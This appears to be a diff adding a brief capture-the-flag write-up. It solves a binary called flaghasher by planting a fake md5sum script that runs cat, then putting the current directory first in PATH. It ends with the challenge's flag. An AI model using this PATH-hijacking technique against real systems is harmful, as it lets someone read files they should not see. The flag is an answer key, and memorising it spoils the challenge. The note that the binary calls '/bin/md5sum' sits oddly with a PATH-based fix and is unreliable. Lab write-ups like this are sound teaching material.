@@ -1,0 +1,14 @@
+In this challenge, we SSH into a remote machine where a binary can be executed.
+The binary uses "/bin/md5sum" to hash the flag file.
+
+In order to solve this, we need to change the md5sum command to cat.
+Do this by creating a bash script file with the name md5sum, then run the binary with current directory as the PATH.
+
+Commands:
+"""
+echo -e '#!/bin/bash\ncat "$1"' > md5sum
+chmod +x md5sum
+PATH=.:$PATH ./flaghasher
+    """
+
+picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_cc661106}
